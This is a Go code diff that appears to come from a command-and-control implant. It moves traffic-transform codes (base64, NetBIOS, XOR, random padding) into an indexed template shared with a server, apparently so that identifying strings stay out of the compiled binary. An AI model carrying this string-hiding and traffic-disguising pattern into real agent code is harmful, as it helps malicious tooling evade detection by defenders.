@@ -18,27 +18,28 @@ import (
 	"strings"
 )
 
-// Transform type codes (single char to reduce binary strings)
-var (
-	tBase64    = string([]byte{0x61})       // a
-	tBase64URL = string([]byte{0x62})       // b
-	tHex       = string([]byte{0x63})       // c
-	tGzip      = string([]byte{0x64})       // d
-	tNetBIOS   = string([]byte{0x65})       // e
-	tXOR       = string([]byte{0x66})       // f
-	tPrepend   = string([]byte{0x67})       // g
-	tAppend    = string([]byte{0x68})       // h
-	tRandPre   = string([]byte{0x69})       // i
-	tRandApp   = string([]byte{0x6a})       // j
+// Transform template indices - must match server's common.go
+const (
+	idxTransBase64    = 760 // a
+	idxTransBase64URL = 761 // b
+	idxTransHex       = 762 // c
+	idxTransGzip      = 763 // d
+	idxTransNetBIOS   = 764 // e
+	idxTransXOR       = 765 // f
+	idxTransPrepend   = 766 // g
+	idxTransAppend    = 767 // h
+	idxTransRandPre   = 768 // i
+	idxTransRandApp   = 769 // j
+	idxCharsetNum     = 770 // 1
+	idxCharsetAlpha   = 771 // 2
+	idxCharsetAlnum   = 772 // 3
+	idxCharsetHex     = 773 // 4
 )
 
-// Charset codes
-var (
-	cNum   = string([]byte{0x31}) // 1
-	cAlpha = string([]byte{0x32}) // 2
-	cAlnum = string([]byte{0x33}) // 3
-	cHex   = string([]byte{0x34}) // 4
-)
+// getTransStr gets transform string from comms template
+func getTransStr(idx int) string {
+	return commsTpl(idx)
+}
 
 // Transform represents a single transformation step
 type Transform struct {
@@ -61,12 +62,19 @@ type TransformResult struct {
 	AppendLength  int
 }
 
-// Character sets for random generation (mapped by code)
-var charsets = map[string]string{
-	cNum:   "0123456789",
-	cAlpha: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
-	cAlnum: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
-	cHex:   "0123456789abcdef",
+// getCharset returns the charset string for a given code
+func getCharset(code string) string {
+	switch code {
+	case getTransStr(idxCharsetNum):
+		return "0123456789"
+	case getTransStr(idxCharsetAlpha):
+		return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	case getTransStr(idxCharsetAlnum):
+		return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	case getTransStr(idxCharsetHex):
+		return "0123456789abcdef"
+	}
+	return ""
 }
 
 // =============================================================================
@@ -80,27 +88,27 @@ func applyTransforms(data []byte, transforms []Transform) (*TransformResult, err
 	for _, t := range transforms {
 		var err error
 		switch t.Type {
-		case tBase64:
+		case getTransStr(idxTransBase64):
 			result.Data = encodeBase64(result.Data)
-		case tBase64URL:
+		case getTransStr(idxTransBase64URL):
 			result.Data = encodeBase64URL(result.Data)
-		case tHex:
+		case getTransStr(idxTransHex):
 			result.Data = encodeHex(result.Data)
-		case tGzip:
+		case getTransStr(idxTransGzip):
 			result.Data, err = encodeGzip(result.Data)
-		case tNetBIOS:
+		case getTransStr(idxTransNetBIOS):
 			result.Data = encodeNetBIOS(result.Data)
-		case tXOR:
+		case getTransStr(idxTransXOR):
 			result.Data = applyXOR(result.Data, []byte(t.Value))
-		case tPrepend:
+		case getTransStr(idxTransPrepend):
 			result.Data = prependBytes(result.Data, []byte(t.Value))
-		case tAppend:
+		case getTransStr(idxTransAppend):
 			result.Data = appendBytes(result.Data, []byte(t.Value))
-		case tRandPre:
+		case getTransStr(idxTransRandPre):
 			padding := generateRandom(t.Length, t.Charset)
 			result.Data = prependBytes(result.Data, padding)
 			result.PrependLength = t.Length
-		case tRandApp:
+		case getTransStr(idxTransRandApp):
 			padding := generateRandom(t.Length, t.Charset)
 			result.Data = appendBytes(result.Data, padding)
 			result.AppendLength = t.Length
@@ -128,29 +136,29 @@ func reverseTransforms(data []byte, transforms []Transform, prependLen, appendLe
 		var err error
 
 		switch t.Type {
-		case tBase64:
+		case getTransStr(idxTransBase64):
 			result, err = decodeBase64(result)
-		case tBase64URL:
+		case getTransStr(idxTransBase64URL):
 			result, err = decodeBase64URL(result)
-		case tHex:
+		case getTransStr(idxTransHex):
 			result, err = decodeHex(result)
-		case tGzip:
+		case getTransStr(idxTransGzip):
 			result, err = decodeGzip(result)
-		case tNetBIOS:
+		case getTransStr(idxTransNetBIOS):
 			result, err = decodeNetBIOS(result)
-		case tXOR:
+		case getTransStr(idxTransXOR):
 			result = applyXOR(result, []byte(t.Value))
-		case tPrepend:
+		case getTransStr(idxTransPrepend):
 			result = stripPrepend(result, len(t.Value))
-		case tAppend:
+		case getTransStr(idxTransAppend):
 			result = stripAppend(result, len(t.Value))
-		case tRandPre:
+		case getTransStr(idxTransRandPre):
 			length := prependLen
 			if length == 0 {
 				length = t.Length
 			}
 			result = stripPrepend(result, length)
-		case tRandApp:
+		case getTransStr(idxTransRandApp):
 			length := appendLen
 			if length == 0 {
 				length = t.Length
@@ -295,9 +303,10 @@ func generateRandom(length int, charset string) []byte {
 		return []byte{}
 	}
 
-	chars := charsets[charset]
+	chars := getCharset(charset)
 	if chars == "" {
-		chars = charsets["alphanumeric"]
+		// Default to alphanumeric
+		chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	}
 
 	result := make([]byte, length)
